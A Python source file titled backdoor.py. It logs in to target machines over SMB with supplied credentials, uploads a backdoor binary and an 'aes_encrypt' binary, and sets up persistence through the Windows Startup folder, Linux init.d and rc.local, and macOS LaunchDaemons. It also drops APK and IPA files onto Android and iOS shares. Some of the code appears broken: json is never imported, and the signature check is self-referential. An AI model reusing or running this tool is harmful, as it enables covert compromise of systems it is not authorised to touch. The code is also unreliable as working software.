# backdoor.py
import os
import random
import sys
from datetime import datetime, timezone
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import pathlib

try:
    from smbprotocol.connection import Connection
    from smbprotocol.session import Session
    from smbprotocol.tree import TreeConnect
    from smbprotocol.open import Open
    from smbprotocol.file import CreateDisposition, FileAttributes, CreateOptions, FilePipePrinterAccessMask
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

def load_rsa_private_key(path: str):
    try:
        path = os.path.abspath(path)
        pem = pathlib.Path(path).read_bytes()
        return serialization.load_pem_private_key(pem, password=None)
    except Exception as e:
        print(f"[ERROR] Failed to load private key: {e}", file=sys.stderr)
        return None

def load_rsa_public_key(path: str):
    try:
        path = os.path.abspath(path)
        pem = pathlib.Path(path).read_bytes()
        return serialization.load_pem_public_key(pem)
    except Exception as e:
        print(f"[ERROR] Failed to load public key: {e}", file=sys.stderr)
        return None

def sign_install_request(private_key, target: str, timestamp: str):
    try:
        payload = {"target": target, "timestamp": timestamp}
        payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        signature = private_key.sign(
            payload_bytes,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        return payload_bytes, signature
    except Exception as e:
        print(f"[ERROR] Failed to sign request: {e}", file=sys.stderr)
        return None, None

def install_backdoor_windows(host: str, username: str, password: str, 
                           private_key_path: str, server_public_key_path: str,
                           aes_binary_path: str, backdoor_binary_path: str,
                           domain: str = "", use_kerberos: bool = False):
    if not SMB_AVAILABLE:
        print("[ERROR] smbprotocol not available", file=sys.stderr)
        return False
    
    priv_key = load_rsa_private_key(private_key_path)
    if not priv_key:
        return False
    
    serv_pub = load_rsa_public_key(server_public_key_path)
    if not serv_pub:
        return False
    
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    if not payload_bytes or not signature:
        return False
    
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception as e:
        print(f"[ERROR] SMB connection failed: {e}", file=sys.stderr)
        return False
    
    try:
        if use_kerberos:
            session = Session(conn, username=username, password=password, 
                             require_encryption=True, use_kerberos=True)
        else:
            session = Session(conn, username=username, password=password, 
                             require_encryption=True)
        session.connect(timeout=5)
    except Exception as e:
        print(f"[ERROR] SMB session failed: {e}", file=sys.stderr)
        conn.disconnect()
        return False
    
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception as e:
        print(f"[ERROR] Signature verification failed: {e}", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        tree = TreeConnect(session, rf"\\{host}\C$")
        tree.connect(timeout=5)
    except Exception as e:
        print(f"[ERROR] Tree connect failed: {e}", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False
    
    # Create Tools directory if needed
    try:
        tools_dir = Open(tree, "Windows\\Tools", 
                        access=FilePipePrinterAccessMask.FILE_READ_DATA |
                               FilePipePrinterAccessMask.FILE_WRITE_DATA |
                               FilePipePrinterAccessMask.FILE_CREATE_CHILD,
                        disposition=CreateDisposition.FILE_OPEN_IF,
                        options=CreateOptions.FILE_DIRECTORY_FILE)
        tools_dir.create(timeout=5)
        tools_dir.close()
    except Exception as e:
        print(f"[WARNING] Tools directory creation failed: {e}", file=sys.stderr)
    
    # Upload AES binary
    aes_name = os.path.basename(aes_binary_path)
    try:
        with open(aes_binary_path, "rb") as f:
            aes_data = f.read()
    except Exception as e:
        print(f"[ERROR] Failed to read AES binary: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        aes_file = Open(tree, f"Windows\\Tools\\{aes_name}", 
                        access=FilePipePrinterAccessMask.FILE_READ_DATA |
                               FilePipePrinterAccessMask.FILE_WRITE_DATA,
                        disposition=CreateDisposition.FILE_OVERWRITE_IF,
                        options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(aes_data, 0)
        aes_file.close()
    except Exception as e:
        print(f"[ERROR] AES binary upload failed: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload backdoor binary
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            backdoor_data = f.read()
    except Exception as e:
        print(f"[ERROR] Failed to read backdoor binary: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        bd_file = Open(tree, f"Windows\\Tools\\{backdoor_name}", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(backdoor_data, 0)
        bd_file.close()
    except Exception as e:
        print(f"[ERROR] Backdoor binary upload failed: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Create startup script
    startup_path = "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\install_backdoor.bat"
    script_content = f"@echo off\r\nstart \"\" \"C:\\Windows\\Tools\\{backdoor_name}\"\r\n"
    
    try:
        startup_file = Open(tree, startup_path, 
                          access=FilePipePrinterAccessMask.FILE_READ_DATA |
                                 FilePipePrinterAccessMask.FILE_WRITE_DATA,
                          disposition=CreateDisposition.FILE_OVERWRITE_IF,
                          options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        startup_file.create(timeout=5)
        startup_file.write(script_content.encode("utf-8"), 0)
        startup_file.close()
    except Exception as e:
        print(f"[ERROR] Startup script creation failed: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Cleanup
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_linux(host: str, share: str, username: str, password: str,
                         private_key_path: str, server_public_key_path: str,
                         aes_binary_path: str, backdoor_binary_path: str,
                         backdoor_script_path: str):
    if not SMB_AVAILABLE:
        return False
    
    priv_key = load_rsa_private_key(private_key_path)
    if not priv_key:
        return False
    
    serv_pub = load_rsa_public_key(server_public_key_path)
    if not serv_pub:
        return False
    
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    if not payload_bytes or not signature:
        return False
    
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload AES binary
    try:
        with open(aes_binary_path, "rb") as f:
            aes_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        aes_file = Open(tree, "usr/local/bin/aes_encrypt", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(aes_data, 0)
        aes_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload backdoor binary
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            backdoor_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        bd_file = Open(tree, f"usr/local/bin/{backdoor_name}", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(backdoor_data, 0)
        bd_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload init script
    script_name = os.path.basename(backdoor_script_path)
    try:
        with open(backdoor_script_path, "rb") as f:
            script_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        script_file = Open(tree, f"etc/init.d/{script_name}", 
                         access=FilePipePrinterAccessMask.FILE_READ_DATA |
                                FilePipePrinterAccessMask.FILE_WRITE_DATA,
                         disposition=CreateDisposition.FILE_OVERWRITE_IF,
                         options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        script_file.create(timeout=5)
        script_file.write(script_data, 0)
        script_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Modify rc.local
    try:
        rc_file = Open(tree, "etc/rc.local", 
                     access=FilePipePrinterAccessMask.FILE_READ_DATA |
                            FilePipePrinterAccessMask.FILE_WRITE_DATA,
                     disposition=CreateDisposition.FILE_OPEN_IF,
                     options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        rc_file.create(timeout=5)
        
        # Read existing content
        content = b""
        offset = 0
        while True:
            chunk = rc_file.read(4096, offset)
            if not chunk:
                break
            content += chunk
            offset += len(chunk)
        
        # Add startup command if not present
        text = content.decode("utf-8", errors="ignore")
        if f"/etc/init.d/{script_name}" not in text:
            if not text.endswith("\n"):
                text += "\n"
            text += f"/etc/init.d/{script_name} &\n"
            rc_file.write(text.encode("utf-8"), 0)
        
        rc_file.close()
    except Exception:
        # Create rc.local if it didn't exist
        try:
            rc_file = Open(tree, "etc/rc.local", 
                         access=FilePipePrinterAccessMask.FILE_READ_DATA |
                                FilePipePrinterAccessMask.FILE_WRITE_DATA,
                         disposition=CreateDisposition.FILE_OVERWRITE_IF,
                         options=CreateOptions.FILE_NON_DIRECTORY_FILE)
            rc_file.create(timeout=5)
            content = f"#!/bin/sh\n/etc/init.d/{script_name} &\n"
            rc_file.write(content.encode("utf-8"), 0)
            rc_file.close()
        except Exception:
            pass
    
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_macos(host: str, share: str, username: str, password: str,
                         private_key_path: str, server_public_key_path: str,
                         aes_binary_path: str, backdoor_binary_path: str,
                         backdoor_plist_path: str):
    if not SMB_AVAILABLE:
        return False
    
    priv_key = load_rsa_private_key(private_key_path)
    if not priv_key:
        return False
    
    serv_pub = load_rsa_public_key(server_public_key_path)
    if not serv_pub:
        return False
    
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    if not payload_bytes or not signature:
        return False
    
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload AES binary
    try:
        with open(aes_binary_path, "rb") as f:
            aes_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        aes_file = Open(tree, "usr/local/bin/aes_encrypt", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(aes_data, 0)
        aes_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload backdoor binary
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            backdoor_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        bd_file = Open(tree, f"usr/local/bin/{backdoor_name}", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(backdoor_data, 0)
        bd_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    # Upload plist
    plist_name = os.path.basename(backdoor_plist_path)
    try:
        with open(backdoor_plist_path, "rb") as f:
            plist_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        plist_file = Open(tree, f"Library/LaunchDaemons/{plist_name}", 
                        access=FilePipePrinterAccessMask.FILE_READ_DATA |
                               FilePipePrinterAccessMask.FILE_WRITE_DATA,
                        disposition=CreateDisposition.FILE_OVERWRITE_IF,
                        options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        plist_file.create(timeout=5)
        plist_file.write(plist_data, 0)
        plist_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_android(host: str, share: str, username: str, 
                           password: str, apks_path: str):
    if not SMB_AVAILABLE:
        return False
    
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    
    apk_name = os.path.basename(apks_path)
    try:
        with open(apks_path, "rb") as f:
            apk_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        apk_file = Open(tree, f"sdcard/{apk_name}", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        apk_file.create(timeout=5)
        apk_file.write(apk_data, 0)
        apk_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_ios(host: str, share: str, username: str, 
                       password: str, ipas_path: str):
    if not SMB_AVAILABLE:
        return False
    
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    
    ipa_name = os.path.basename(ipas_path)
    try:
        with open(ipas_path, "rb") as f:
            ipa_data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    try:
        ipa_file = Open(tree, f"private/var/mobile/Media/{ipa_name}", 
                      access=FilePipePrinterAccessMask.FILE_READ_DATA |
                             FilePipePrinterAccessMask.FILE_WRITE_DATA,
                      disposition=CreateDisposition.FILE_OVERWRITE_IF,
                      options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        ipa_file.create(timeout=5)
        ipa_file.write(ipa_data, 0)
        ipa_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_cloud(host: str, share: str, username: str, password: str,
                         private_key_path: str, server_public_key_path: str,
                         aes_binary_path: str, backdoor_binary_path: str,
                         backdoor_script_path: str, cloud_provider: str):
    # Cloud installations use the same method as Linux
    return install_backdoor_linux(
        host=host,
        share=share,
        username=username,
        password=password,
        private_key_path=private_key_path,
        server_public_key_path=server_public_key_path,
        aes_binary_path=aes_binary_path,
        backdoor_binary_path=backdoor_binary_path,
        backdoor_script_path=backdoor_script_path
    )